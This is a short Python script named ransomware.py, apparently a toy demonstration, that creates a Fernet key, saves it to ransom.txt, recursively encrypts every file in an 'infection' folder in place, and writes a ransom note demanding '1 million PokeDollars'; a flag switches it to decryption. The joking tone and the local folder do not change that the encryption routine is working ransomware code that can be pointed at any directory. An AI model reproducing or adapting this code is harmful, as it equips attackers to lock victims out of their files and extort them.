# Must be run with the sudo python3 command, i.e. sudo python3 ransomware.py. 
from cryptography.fernet import Fernet
import os
import glob
import base64
from os import path

print("Mwahaha we are encrypting all of your files! We're so EVIL!")

class Ransomware:

	def generate_encryption_key(self):
		key = Fernet.generate_key()
		key = str(key)
		key = key[2:]
		key = key[:len(key)-1]

		with open("ransom.txt", "w") as keyfile:
			keyfile.write(key)
		answer = open("ransom.txt", "r").read()

	def load_encryption_key(self):
		return open("ransom.txt", "r").read()

	def encrypt_file(self, key, directory):
		print("Encrypting file...")
		for x in os.walk(directory):
			for item in glob.glob(os.path.join(x[0], "*")):
				if os.path.isfile(item):
					evil_key = Fernet(key)
					file = open(item, "rb")
					encrypted_result = evil_key.encrypt(file.read())
					file.close()
					new_file = open(item, "wb")
					new_file.write(encrypted_result)
					new_file.close()
		

	def decrypt_file(self, key, directory):
		print("Decrypting file...")
		for x in os.walk(directory):
			for item in glob.glob(os.path.join(x[0], "*")):
				if os.path.isfile(item):
					evil_key = Fernet(key)
					file = open(item, "rb")
					decrypted_result = evil_key.decrypt(file.read())
					file.close()
					new_file = open(item, "wb")
					new_file.write(decrypted_result)
					new_file.close()

if __name__ == "__main__":
	
	# Change this if you want to decrypt. Don't decrypt if you haven't encrypted. 
	encrypt = False

	ransomware = Ransomware()
	if not path.exists("infection/ransom.key") and encrypt:
		ransomware.generate_encryption_key()

	if encrypt:
		file = ransomware.load_encryption_key()
		ransomware.encrypt_file(file, "infection")
		answer = open("ransom.txt", "r").read()
		ransom_file = open("infection/what_happened_to_my_files.txt", "a")
		ransom_file.write("What happened to my files?\n")
		ransom_file.write("We have hacked into your computer and encrypted them! If you want us to decrypt them, you must pay us 1 million PokeDollars!")
		ransom_file.close()
		answer = open("ransom.txt", "r").read()
	else:
		if path.exists("infection/what_happened_to_my_files.txt"):
			os.remove("infection/what_happened_to_my_files.txt")
		ransomware.decrypt_file(ransomware.load_encryption_key(), "infection")
		os.remove("ransom.txt")
